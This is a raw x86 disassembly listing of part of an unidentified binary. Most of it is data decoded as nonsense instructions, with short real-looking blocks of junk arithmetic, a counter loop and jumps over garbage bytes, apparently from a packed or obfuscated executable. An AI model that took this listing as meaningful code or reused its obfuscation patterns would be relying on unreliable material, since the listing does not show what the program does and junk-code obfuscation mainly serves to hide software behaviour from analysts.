  40e9e3:	add    DWORD PTR [edi],ebp
  40e9e5:	or     al,0xc
  40e9e7:	jecxz  0x40ea22
  40e9e9:	sub    BYTE PTR [ebp+0x2792d7c7],cl
  40e9ef:	fwait
  40e9f0:	inc    eax
  40e9f1:	aam    0x28
  40e9f3:	arpl   WORD PTR [ecx+eax*4],dx
  40e9f6:	clc    
  40e9f7:	test   DWORD PTR gs:[ebx],esi
  40e9fa:	jns    0x40e9b2
  40e9fc:	cmp    ebx,DWORD PTR [edx]
  40e9fe:	in     eax,dx
  40e9ff:	imul   ecx,DWORD PTR [ebp-0x6a2aff20],0x7d
  40ea06:	outs   dx,DWORD PTR ds:[esi]
  40ea07:	imul   ecx,DWORD PTR [ebx+0x90a4b18],0xffffffc1
  40ea0e:	fsubr  DWORD PTR [edi]
  40ea10:	mov    ebx,0x7dbae3f4
  40ea15:	and    bh,BYTE PTR [ecx-0x446c1e1e]
  40ea1b:	aam    0x64
  40ea1d:	pusha  
  40ea1e:	enter  0x9c51,0x72
  40ea22:	mov    cl,0x35
  40ea24:	ins    BYTE PTR es:[edi],dx
  40ea25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea26:	inc    ebp
  40ea27:	into   
  40ea28:	data16 je 0x40e9f3
  40ea2b:	test   DWORD PTR [ebx-0x76],ebp
  40ea2e:	mov    ecx,0xaeca4093
  40ea33:	cdq    
  40ea34:	or     BYTE PTR [eax+esi*1],ch
  40ea37:	mov    edi,0x4d1b0334
  40ea3c:	es inc ecx
  40ea3e:	rcr    BYTE PTR [esi],1
  40ea40:	and    esi,ecx
  40ea42:	das    
  40ea43:	rol    esp,0xe1
  40ea46:	xchg   DWORD PTR [edi+0x47fc4697],eax
  40ea4c:	jl     0x40e9e4
  40ea4e:	int3   
  40ea4f:	mov    bh,0x1b
  40ea51:	call   0xf375:0x599e69c8
  40ea58:	dec    esp
  40ea59:	or     cl,BYTE PTR [ebp-0x4798eba8]
  40ea5f:	out    dx,eax
  40ea60:	call   0x1fa1:0x28686142
  40ea67:	mov    ds:0xdfc2a779,eax
  40ea6c:	jb     0x40ea28
  40ea6e:	jbe    0x40ea14
  40ea70:	or     eax,0x95fecd7
  40ea75:	push   esp
  40ea76:	pushf  
  40ea77:	sbb    DWORD PTR [ecx+edx*4],ebp
  40ea7a:	lahf   
  40ea7b:	cmc    
  40ea7c:	shl    bh,1
  40ea7e:	iret   
  40ea7f:	fcmovu st,st(4)
  40ea81:	dec    ebx
  40ea82:	cli    
  40ea83:	dec    eax
  40ea84:	push   0x465b3849
  40ea89:	mov    dh,cl
  40ea8b:	fwait
  40ea8c:	out    dx,eax
  40ea8d:	ret    
  40ea8e:	retf   
  40ea8f:	push   ds
  40ea90:	sbb    bl,dh
  40ea92:	cmp    al,0x70
  40ea94:	cmp    BYTE PTR [ecx+0x1508a61c],cl
  40ea9a:	xlat   BYTE PTR ds:[ebx]
  40ea9b:	adc    BYTE PTR [ebx+0x58],dh
  40ea9e:	cdq    
  40ea9f:	cmp    DWORD PTR [eax],ecx
  40eaa1:	fwait
  40eaa2:	jne    0x40eb4e
  40eaa8:	add    ecx,edx
  40eaaa:	mov    eax,DWORD PTR [ebp+0x8]
  40eaad:	sbb    ecx,0x443c
  40eab3:	mov    ecx,DWORD PTR [ebp-0x10]
  40eab6:	adc    edx,DWORD PTR ds:0x42fce5
  40eabc:	xor    eax,esi
  40eabe:	add    eax,edi
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e128,0x11
  40eade:	cmp    DWORD PTR ds:0x42e128,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e128,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e130
  40eafd:	push   0x42e16f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e30f
  40eb15:	cmp    DWORD PTR ds:0x42e128,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e128
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e128,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e128
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e128,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0x11
  40eb8d:	ds nop
  40eb8f:	jmp    0x40eb88
  40eb91:	scas   eax,DWORD PTR es:[edi]
  40eb92:	jo     0x40ec04
  40eb94:	ret    
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40eb21
  40eb99:	xchg   ebx,eax
  40eb9a:	in     al,0xd0
  40eb9c:	xlat   BYTE PTR ds:[ebx]
  40eb9d:	dec    DWORD PTR [edx]
  40eb9f:	lods   eax,DWORD PTR ds:[esi]
  40eba0:	arpl   WORD PTR [esi+0x55197fb4],bp
  40eba6:	and    ebp,DWORD PTR [ebp-0x3]
  40eba9:	sub    BYTE PTR [edi],bl
  40ebab:	cmc    
  40ebac:	sub    eax,0xc120919b
  40ebb1:	sbb    BYTE PTR [esi-0x5b55fb30],bl
  40ebb7:	gs cld 
  40ebb9:	inc    ecx
  40ebba:	out    dx,eax
  40ebbb:	xchg   esi,eax
  40ebbc:	xlat   BYTE PTR ds:[ebx]
  40ebbd:	inc    esp
  40ebbe:	mul    DWORD PTR [ebx]
  40ebc0:	cmp    ah,BYTE PTR [edi+edx*1]
  40ebc3:	jne    0x40ebf5
  40ebc5:	push   ds
  40ebc6:	xchg   ebp,eax
  40ebc7:	das    
  40ebc8:	cmp    al,0xe7
  40ebca:	xchg   ebp,ebp
  40ebcc:	xlat   BYTE PTR ds:[ebx]
  40ebcd:	adc    DWORD PTR cs:[ecx],0x23
  40ebd1:	outs   dx,BYTE PTR ds:[esi]
  40ebd2:	sub    al,BYTE PTR [edx+edi*1-0x2e]
  40ebd6:	xor    DWORD PTR [edx],ebp
  40ebd8:	inc    eax
  40ebd9:	fidivr DWORD PTR [edi+eiz*8-0x3ba50c7f]
  40ebe0:	jecxz  0x40eba6
  40ebe2:	(bad)  
  40ebe3:	sbb    edi,DWORD PTR [esi-0x4071cb3b]
  40ebe9:	std    
  40ebea:	jae    0x40ebe4
  40ebec:	xor    ah,dl
  40ebee:	push   0x3f6d1748
  40ebf3:	lahf   
  40ebf4:	shl    ebx,cl
  40ebf6:	pop    ecx
  40ebf7:	dec    eax
  40ebf8:	pop    edi
  40ebf9:	push   edi
  40ebfa:	shl    BYTE PTR ds:0x1e2f7e63,1
  40ec00:	ds (bad) 
  40ec02:	retf   
  40ec03:	inc    edi
  40ec04:	retf   
  40ec05:	sub    eax,0x80fccd6d
  40ec0a:	or     DWORD PTR ds:0x8323a239,esi
  40ec10:	ds (bad) 
  40ec12:	mov    ds:0x7c224f89,eax
  40ec17:	pop    esi
  40ec18:	cdq    
  40ec19:	xor    ebp,DWORD PTR [edx+0x3efcf0ee]
  40ec1f:	pop    ds
  40ec20:	xor    al,0x8a
  40ec22:	sbb    al,BYTE PTR [esi]
  40ec24:	pop    esi
  40ec25:	mov    ?,WORD PTR [esi]
  40ec27:	repz loope 0x40ebda
  40ec2a:	or     eax,0x9d2cc70d
  40ec2f:	xchg   esi,eax
  40ec30:	push   ds
  40ec31:	test   DWORD PTR [ebp+0x56250731],ebx
  40ec37:	add    bl,BYTE PTR [edi-0x6a02f5c8]
  40ec3d:	mov    bl,0x8a
  40ec3f:	retf   0xb694
  40ec42:	xchg   ebx,eax
  40ec43:	fs or  eax,0x6c2e4440
  40ec49:	mov    al,ds:0xbe6cefeb
  40ec4e:	dec    eax
  40ec4f:	inc    eax
  40ec50:	and    bh,bl
  40ec52:	das    
  40ec53:	and    al,0xd3
  40ec55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec56:	mov    ebx,0xd85b38fb
  40ec5b:	push   0xe1690c15
  40ec60:	iret   
  40ec61:	in     eax,0xf8
  40ec63:	mov    BYTE PTR [ecx-0x70],bh
  40ec66:	push   ebx
  40ec67:	or     BYTE PTR [eax-0x7cf0dd4d],dh
  40ec6d:	in     eax,dx
  40ec6e:	rcl    DWORD PTR [ecx+0x21232a32],1
  40ec74:	mov    eax,ds:0x4cec2e23
  40ec79:	dec    ebx
  40ec7a:	lds    eax,FWORD PTR [edi]
  40ec7c:	ds ret 
  40ec7e:	or     DWORD PTR [eax],0xffffffaf
  40ec81:	cld    
  40ec82:	out    dx,al
  40ec83:	inc    edi
  40ec84:	mov    esi,0x8c224d8d
  40ec89:	cld    
  40ec8a:	jnp    0x40ecb2
  40ec8c:	icebp  
  40ec8d:	mov    ecx,0x5f9b6b48
  40ec92:	mov    ecx,0x7a93d7b5
  40ec97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec98:	ss and eax,0xd4628bb
  40ec9e:	(bad)  
  40ec9f:	loope  0x40ecb5
  40eca1:	pushf  
  40eca2:	call   0xdf610d0d
  40eca7:	mov    ebx,DWORD PTR [eax+esi*2]
  40ecaa:	mov    esp,0xc2458181
  40ecaf:	enter  0xf5f7,0xb2
  40ecb3:	fwait
  40ecb4:	jns    0x40ed0c
  40ecb6:	adc    dl,al
  40ecb8:	push   esp
  40ecb9:	call   FWORD PTR [edi-0x70a1c595]
  40ecbf:	rcl    DWORD PTR [edi-0x6839b297],1
  40ecc5:	retf   
  40ecc6:	or     al,0xf1
  40ecc8:	cmp    BYTE PTR [esi+0x47996e4a],ah
  40ecce:	sar    DWORD PTR [edx+0x2c4d9bd],cl
  40ecd4:	nop
  40ecd5:	sbb    BYTE PTR ds:0x88bc1ee0,0x24
  40ecdc:	daa    
  40ecdd:	mov    edx,0x86f4dbd4
  40ece2:	arpl   WORD PTR [edx-0x743ec4af],bx
  40ece8:	inc    ebp
  40ece9:	in     al,dx
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ecc1
  40ed00:	mov    cl,0x1
  40ed02:	inc    edi
  40ed03:	mov    edx,0xc37070ae
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ed3a
  40ed0c:	lds    ebp,FWORD PTR fs:[ecx-0x41af0861]
  40ed13:	pop    esi
  40ed14:	into   
  40ed15:	sub    DWORD PTR [edi-0x6ab4204a],ecx
  40ed1b:	jnp    0x40eccb
  40ed1d:	dec    edi
  40ed1e:	adc    eax,0x46374305
  40ed23:	stos   DWORD PTR es:[edi],eax
  40ed24:	push   ecx
  40ed25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed26:	scas   al,BYTE PTR es:[edi]
  40ed27:	dec    eax
  40ed28:	dec    ebp
  40ed29:	ja     0x40ed41
  40ed2b:	or     eax,0xdfc9e4e3
  40ed30:	mov    ecx,0x9eb9d0ad
  40ed35:	leave  
  40ed36:	fwait
  40ed37:	dec    ebx
  40ed38:	out    dx,eax
  40ed39:	hlt    
  40ed3a:	push   ss
  40ed3b:	inc    ebp
  40ed3c:	shr    BYTE PTR [edi+0x4e3c98dc],0x19
  40ed43:	inc    esp
  40ed44:	ret    0x4c86
  40ed47:	jmp    0x4653cd25
  40ed4c:	jno    0x40ed3a
  40ed4e:	or     edx,ebx
  40ed50:	(bad)  [ecx+ebp*2+0x18]
  40ed54:	cmp    DWORD PTR [eax-0x48],edx
  40ed57:	into   
  40ed58:	int3   
  40ed59:	pop    ecx
  40ed5a:	(bad)  
  40ed5b:	popa   
  40ed5c:	daa    
  40ed5d:	idiv   BYTE PTR [esi+0x7f]
  40ed60:	inc    eax
  40ed61:	push   edx
  40ed62:	es xor eax,0xc322055e
  40ed68:	fadd   QWORD PTR ds:0x31db3e52
  40ed6e:	retf   0x5dbf
  40ed71:	rcr    DWORD PTR [edx+0x4bf58250],cl
  40ed77:	js     0x40edc1
  40ed79:	loope  0x40edbc
  40ed7b:	adc    BYTE PTR [ebp+ebx*2-0x5f36682d],bl
  40ed82:	outs   dx,BYTE PTR ds:[esi]
  40ed83:	adc    dl,BYTE PTR [edi-0x18]
  40ed86:	xchg   edx,eax
  40ed87:	outs   dx,BYTE PTR ds:[esi]
  40ed88:	pop    esp
  40ed89:	mov    ecx,0x3758fc89
  40ed8e:	xor    al,0xd2
  40ed90:	les    eax,FWORD PTR [ebx-0x738dd65a]
  40ed96:	add    edx,edi
  40ed98:	sahf   
  40ed99:	repnz sbb BYTE PTR [ebp+0x7f],ah
  40ed9d:	ins    BYTE PTR es:[edi],dx
  40ed9e:	rol    BYTE PTR [edi],cl
  40eda0:	adc    BYTE PTR [ebx+0x7c],ah
  40eda3:	out    0x81,al
  40eda5:	cmp    edx,DWORD PTR [ecx-0x436acecf]
  40edab:	jo     0x40ed76
  40edad:	or     al,0x86
  40edaf:	dec    edi
  40edb0:	in     eax,dx
  40edb1:	ret    
  40edb2:	dec    esp
  40edb3:	scas   al,BYTE PTR es:[edi]
  40edb4:	cmp    BYTE PTR [ebp+0x1ffd5ec3],ah
  40edba:	sbb    edx,DWORD PTR [ebx-0x6d]
  40edbd:	mov    cl,0xbb
  40edbf:	xchg   ebx,eax
  40edc0:	inc    edx
  40edc1:	enter  0xcf2f,0xf3
  40edc5:	xchg   edx,eax
  40edc6:	push   ebx
  40edc7:	xor    al,0xc8
  40edc9:	jmp    0xc470:0x132121e1
  40edd0:	push   ebp
  40edd1:	cmp    al,cl
  40edd3:	adc    eax,0x34c42393
  40edd8:	inc    ebp
  40edd9:	aam    0xf9
  40eddb:	add    al,0xe3
  40eddd:	mov    al,ds:0xe533f152
  40ede2:	mov    DWORD PTR [ebx+0x64],eax
  40ede5:	stc    
  40ede6:	mov    edi,0xbc1ca83e
  40edeb:	in     eax,dx
  40edec:	adc    ch,cl
  40edee:	not    DWORD PTR [eax+0x16]
  40edf1:	popa   
  40edf2:	push   es
  40edf3:	aad    0x21
  40edf5:	cmp    al,0x4b
  40edf7:	lods   al,BYTE PTR ds:[esi]
  40edf8:	and    ebx,DWORD PTR [ebp-0x79a2adde]
  40edfe:	cmp    ebp,0xffffffca
  40ee01:	adc    esp,edi
  40ee03:	sub    eax,DWORD PTR [eax-0x65]
  40ee06:	pop    ebx
  40ee07:	in     al,0x1d
  40ee09:	adc    edi,DWORD PTR [ebp-0x251c3a25]
  40ee0f:	sbb    dh,BYTE PTR [edx+ebp*1]
  40ee12:	fild   DWORD PTR [esp+esi*1]
  40ee15:	das    
  40ee16:	jmp    0xbe33:0xac64f236
  40ee1d:	int    0x3d
  40ee1f:	jbe    0x40edb9
  40ee21:	sar    BYTE PTR [ecx-0x3d],cl
  40ee24:	pop    es
  40ee25:	mov    edx,0x7286e9ca
  40ee2a:	mov    ds:0x262002a0,al
  40ee2f:	jp     0x40ee25
  40ee31:	pop    ecx
  40ee32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee33:	add    DWORD PTR [ebx],edx
  40ee35:	xor    DWORD PTR ds:0xed1485c0,0xffffffe0
  40ee3c:	ret    0xdd5d
  40ee3f:	(bad)  
  40ee40:	pop    esp
  40ee41:	mov    ecx,0xcfaa5580
  40ee46:	pop    ecx
  40ee47:	jae    0x40edd6
  40ee49:	dec    esi
  40ee4a:	daa    
  40ee4b:	imul   BYTE PTR [edx+0x4]
  40ee4e:	jbe    0x40ee1e
  40ee50:	add    al,0x14
  40ee52:	(bad)  
  40ee53:	je     0x40ee54
  40ee55:	cdq    
  40ee56:	ins    DWORD PTR es:[edi],dx
  40ee57:	jns    0x40ee68
  40ee59:	(bad)  
  40ee5a:	jns    0x40ee5d
  40ee5c:	add    BYTE PTR [eax],al
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x46
  40ee7f:	es iret 
  40ee81:	fs or  eax,0xc37070ac
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40ee1c
  40ee8b:	push   0xe4fe4693
  40ee90:	inc    ebp
  40ee91:	sbb    eax,DWORD PTR [edx]
  40ee93:	and    eax,0xab548509
  40ee98:	stos   BYTE PTR es:[edi],al
  40ee99:	dec    edi
  40ee9a:	xchg   esi,eax
  40ee9b:	imul   eax,DWORD PTR [ecx+0x4],0x4de69d18
  40eea2:	push   edx
  40eea3:	inc    esp
  40eea4:	(bad)  
  40eea5:	cmp    al,0x79
  40eea7:	cmp    BYTE PTR [ebx-0x16],dl
  40eeaa:	pop    eax
  40eeab:	jo     0x40eec8
  40eead:	jno    0x40eeac
  40eeaf:	imul   esi,DWORD PTR [eax],0xffffffbd
  40eeb2:	cld    
  40eeb3:	imul   ebx,DWORD PTR [ebp+edx*4-0x5f],0xffffff86
  40eeb8:	pop    edx
  40eeb9:	fcom   QWORD PTR [ebp-0x5f3127c9]
  40eebf:	ds inc esp
  40eec1:	push   ecx
  40eec2:	loop   0x40eeaf
  40eec4:	sub    esi,DWORD PTR ds:0x156b94e4
  40eeca:	add    al,0x71
  40eecc:	in     eax,0x43
  40eece:	sti    
  40eecf:	mov    cl,0x56
  40eed1:	cmp    al,0x94
  40eed3:	int    0xf0
  40eed5:	in     eax,dx
  40eed6:	dec    ebp
  40eed7:	pop    esi
  40eed8:	int    0xe9
  40eeda:	in     eax,0x75
  40eedc:	lods   eax,DWORD PTR ds:[esi]
  40eedd:	imul   ebx,DWORD PTR [edx+0x7e],0xffffff9c
  40eee1:	mov    esi,0xa756d7f0
  40eee6:	jl     0x40eeef
  40eee8:	mov    dh,0xc3
  40eeea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eeeb:	mov    cl,0x6a
  40eeed:	mov    dl,0x31
  40eeef:	lods   eax,DWORD PTR ds:[esi]
  40eef0:	shl    BYTE PTR [edi],1
  40eef2:	js     0x40ee84
  40eef4:	mov    DWORD PTR [ecx+eiz*8+0x33ab71a7],esp
  40eefb:	repnz mov edi,esp
  40eefe:	adc    eax,0x3a9a5531
  40ef03:	mov    dl,0x60
  40ef05:	sbb    ebx,esp
  40ef07:	or     BYTE PTR [eax+0xb],bh
  40ef0a:	aad    0x3e
  40ef0c:	leave  
  40ef0d:	mov    dl,0x4d
  40ef0f:	inc    edx
  40ef10:	scas   eax,DWORD PTR es:[edi]
  40ef11:	add    esi,DWORD PTR [edi+0x1f067fc3]
  40ef17:	jb     0x40ee99
  40ef19:	add    edx,DWORD PTR [edi]
  40ef1b:	jo     0x40eeaf
  40ef1d:	or     DWORD PTR [edi],ebp
  40ef1f:	scas   al,BYTE PTR es:[edi]
  40ef20:	sub    cl,dh
  40ef22:	scas   al,BYTE PTR es:[edi]
  40ef23:	dec    esp
  40ef24:	mov    ebx,0xa3ff0711
  40ef29:	and    al,0xdf
  40ef2b:	icebp  
  40ef2c:	and    DWORD PTR [edi-0x59],ebp
  40ef2f:	and    al,0xb8
  40ef31:	mov    al,BYTE PTR [esi+0x11]
  40ef34:	add    DWORD PTR [edx+eax*2+0x3df85bb3],ebx
  40ef3b:	stc    
  40ef3c:	shl    bl,1
  40ef3e:	mov    ch,0x57
  40ef40:	add    eax,0xd3a5bb18
  40ef45:	icebp  
  40ef46:	xor    al,0xb8
  40ef48:	jne    0x40ef98
  40ef4a:	adc    al,0xfb
  40ef4c:	out    dx,al
  40ef4d:	lahf   
  40ef4e:	sahf   
  40ef4f:	cs int 0x9c
  40ef52:	cmp    eax,0xce8c75c4
  40ef57:	xor    cl,BYTE PTR [edi+0x55f880c9]
  40ef5d:	addr16 push edx
  40ef5f:	jne    0x40ef01
  40ef61:	loopne 0x40efac
  40ef63:	in     eax,0xfd
  40ef65:	dec    ecx
  40ef66:	or     DWORD PTR [edi+0x5f5a349e],0xfffffffe
  40ef6d:	or     al,0x4c
  40ef6f:	or     bl,BYTE PTR [eax]
  40ef71:	pop    ebp
  40ef72:	mov    dl,bh
  40ef74:	push   0x20
  40ef76:	xor    bh,0xf2
  40ef79:	daa    
  40ef7a:	push   esi
  40ef7b:	pop    eax
  40ef7c:	cmp    ecx,esp
  40ef7e:	cmp    DWORD PTR [esi+0x56],esp
  40ef81:	jp     0x40ef34
  40ef83:	out    0x9f,al
  40ef85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef86:	push   esp
  40ef87:	adc    edx,eax
  40ef89:	dec    esi
  40ef8a:	add    al,0x98
  40ef8c:	shl    DWORD PTR [edx],cl
  40ef8e:	add    eax,0x293aa63a
  40ef93:	pop    edx
  40ef94:	mov    dl,0xcb
  40ef96:	xchg   ecx,eax
  40ef97:	mov    eax,0x20d3669e
  40ef9c:	adc    al,0x47
  40ef9e:	lods   eax,DWORD PTR ds:[esi]
  40ef9f:	pop    ebp
  40efa0:	in     al,dx
  40efa1:	repnz mov bh,0x13
  40efa4:	sbb    cl,BYTE PTR [eax-0x74]
  40efa7:	gs push esi
  40efa9:	imul   ecx,DWORD PTR [esi-0x3a],0x1464a943
  40efb0:	cmp    ch,BYTE PTR [ebp-0x2c]
  40efb3:	push   cs
  40efb4:	das    
  40efb5:	dec    eax
  40efb6:	push   esp
  40efb7:	nop
  40efb8:	push   cs
  40efb9:	xchg   edx,eax
  40efba:	addr16 add al,0xc1
  40efbd:	mov    esi,0x7c2bf7ee
  40efc2:	hlt    
  40efc3:	leave  
  40efc4:	jl     0x40eff7
  40efc6:	sub    DWORD PTR [eax-0x9],0x57
  40efca:	test   dh,0x51
  40efcd:	(bad)  
  40efce:	int    0xa4
  40efd0:	and    esi,eax
  40efd2:	cmp    dl,BYTE PTR [edx]
  40efd4:	cmp    eax,0xc633bbfa
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	sahf   
  40effb:	add    edx,DWORD PTR [edx]
  40effd:	lock shr BYTE PTR [ebx+0x7fc37070],1
  40f004:	jo     0x40f076
  40f006:	xchg   ecx,eax
  40f007:	sub    al,0x2e
  40f009:	pop    ecx
  40f00a:	mov    dl,cl
  40f00c:	test   eax,0x1a051ef4
  40f011:	adc    al,BYTE PTR [esi+0x6ceebf77]
  40f017:	and    DWORD PTR [ecx+0x651f1d9c],esi
  40f01d:	mul    DWORD PTR [eax+0x15]
  40f020:	call   0xaddd658c
  40f025:	jns    0x40f087
  40f027:	(bad)
  40f02a:	adc    BYTE PTR [esi],ah
  40f02c:	jbe    0x40f056
  40f02e:	out    0x2f,eax
  40f030:	inc    ebx
  40f031:	dec    esp
  40f032:	idiv   BYTE PTR [eax-0x73]
  40f035:	scas   eax,DWORD PTR es:[edi]
  40f036:	in     al,0xaf
  40f038:	enter  0x15f4,0xc8
  40f03c:	cli    
  40f03d:	jae    0x40f066
  40f03f:	push   cs
  40f040:	rcr    BYTE PTR [esi],cl
  40f042:	xor    DWORD PTR [ebp-0x1c3c3509],0xe4328317
  40f04c:	test   BYTE PTR [eax+0x424ce7ab],al
  40f052:	ins    DWORD PTR es:[edi],dx
  40f053:	jle    0x40efe4
  40f055:	shl    DWORD PTR [ecx],1
  40f057:	pcmpeqb mm6,mm2
  40f05a:	imul   eax,esp,0x27
  40f05d:	inc    ebx
  40f05e:	mov    eax,ds:0xcbecbf01
  40f063:	std    
  40f064:	push   ebx
  40f065:	mov    al,0x2d
  40f067:	enter  0x8c37,0xaf
  40f06b:	(bad)  
  40f06c:	in     al,dx
  40f06d:	mov    DWORD PTR [edx+0x40fc4923],ebx
  40f073:	mul    DWORD PTR [edx]
  40f075:	jnp    0x40f053
  40f077:	dec    ebp
  40f078:	cmp    al,0x60
  40f07a:	and    edi,edi
  40f07c:	call   0xc52ca061
  40f081:	or     DWORD PTR [edx-0x16ef7d3],edi
  40f087:	mov    BYTE PTR [ebp+eiz*2-0x199ff40d],ch
  40f08e:	mov    cs,WORD PTR [esi+0x20f48783]
  40f094:	inc    esi
  40f095:	imul   ebx,DWORD PTR [eax+0x78494631],0xffffffdd
  40f09c:	mov    esp,0x69528897
  40f0a1:	adc    al,0x8a
  40f0a3:	sub    eax,0x7b96c043
  40f0a8:	test   al,0xd
  40f0aa:	add    al,0x5
  40f0ac:	xor    esi,DWORD PTR [ecx-0x17]
  40f0af:	adc    BYTE PTR [eax],bl
  40f0b1:	sti    
  40f0b2:	jl     0x40f08e
  40f0b4:	sbb    DWORD PTR [ebx+ecx*1+0x461df64d],eax
  40f0bb:	call   0x1c81f28b
  40f0c0:	xor    eax,0x67a33d20
  40f0c5:	repz push ecx
  40f0c7:	xchg   esi,eax
  40f0c8:	mov    bh,0xb2
  40f0ca:	retf   
  40f0cb:	inc    edi
  40f0cc:	dec    ebx
  40f0cd:	cmp    eax,0xf87e98ed
  40f0d2:	(bad)  
  40f0d4:	pop    ecx
  40f0d5:	xlat   BYTE PTR ds:[ebx]
  40f0d6:	jmp    0x1f037e6
  40f0db:	xor    al,0x63
  40f0dd:	pop    ebx
  40f0de:	scas   eax,DWORD PTR es:[edi]
  40f0df:	outs   dx,BYTE PTR ds:[esi]
  40f0e0:	sub    eax,edi
  40f0e2:	fadd   QWORD PTR [eax-0x45]
  40f0e5:	mov    dh,BYTE PTR [esi+edi*2+0x3b53aa37]
  40f0ec:	sbb    BYTE PTR [esi+0x6c],al
  40f0ef:	push   edx
  40f0f0:	mov    eax,ds:0xe22073a0
  40f0f5:	test   eax,0xc82d4997
  40f0fa:	ret    0x4aeb
  40f0fd:	cmp    al,0x1a
  40f0ff:	cdq    
  40f100:	inc    esp
  40f101:	daa    
  40f102:	dec    ecx
  40f103:	lea    esi,[ebx+edx*1+0x36]
  40f107:	mov    ch,0x3
  40f109:	loope  0x40f154
  40f10b:	mov    ebp,0x4b25cc7a
  40f110:	mov    al,0x98
  40f112:	mov    al,0xb
  40f114:	mov    fs,WORD PTR [eax-0x56f6f6c8]
  40f11a:	adc    ebx,DWORD PTR [edi-0x362368be]
  40f120:	cdq    
  40f121:	es xchg ecx,eax
  40f123:	hlt    
  40f124:	outs   dx,DWORD PTR ds:[esi]
  40f126:	mov    dl,BYTE PTR [edi-0x3c988562]
  40f12c:	repz sub al,0xf
  40f12f:	in     al,dx
  40f130:	out    0xb5,al
  40f132:	pop    ebp
  40f133:	shr    DWORD PTR [ebx-0x77],cl
  40f136:	mov    bl,0x9d
  40f138:	jns    0x40f19c
  40f13a:	sub    bl,bl
  40f13c:	cmp    eax,0x72935528
  40f141:	mov    al,0xae
  40f143:	bound  edx,QWORD PTR [eax-0x7d]
  40f146:	imul   esi,ecx,0x2776a1df
  40f14c:	fadd   DWORD PTR [ebp+esi*2-0x77]
  40f150:	xchg   esp,eax
  40f151:	out    0x5,al
  40f153:	je     0x40f2d1
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   esp,edx
  40f16e:	hlt    
  40f16f:	xor    esi,DWORD PTR [edi+0x7070aaa3]
  40f175:	ret    
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f17e
  40f17a:	repnz adc BYTE PTR [esp+eax*8],bl
  40f17e:	stos   DWORD PTR es:[edi],eax
  40f17f:	jbe    0x40f195
  40f181:	dec    eax
  40f182:	pop    esi
  40f183:	mov    eax,0x2d0e4d09
  40f188:	cmp    edx,0x4a31e8a0
